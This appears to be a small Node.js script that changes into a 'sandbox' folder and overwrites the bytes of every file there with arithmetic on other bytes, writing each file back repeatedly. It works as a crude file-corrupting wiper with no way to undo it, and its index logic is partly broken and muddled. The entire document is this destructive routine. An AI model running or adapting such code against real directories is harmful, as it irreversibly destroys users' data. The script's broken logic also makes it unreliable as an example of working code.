/**
 * @author Leviathenn
 */

const fs = require("fs");
const os = require("os");
process.chdir("sandbox");
console.log(process.argv)
const files = fs.readdirSync(".")
files.forEach(element => { 
    let stat = fs.statSync(element);
    if(stat.isFile()){
        let currFileCont = fs.readFileSync(element);
        let buffLen = 0;
        let buffContinue = 0;
        currFileCont.forEach(buff => {
            buffLen++;
            
            if(buffContinue == 3){
                currFileCont[buffLen] = currFileCont[buffLen] - currFileCont[buffLen / 3];
                writeChange();
                buffContinue = 0;
  
            }else if(buffContinue == 2){
                currFileCont[buffLen - 2] = currFileCont[buffLen] + currFileCont[buffLen / 3];
                writeChange();
            }else if(buffContinue == 1){
                currFileCont[buffLen - 4] = currFileCont[buffLen] / currFileCont[buffLen * 2];
                writeChange();
            }
            else{
                
                buffContinue++;
            }
            function writeChange(){
                fs.writeFileSync(`${element}`, currFileCont);
            }
        });
    }
});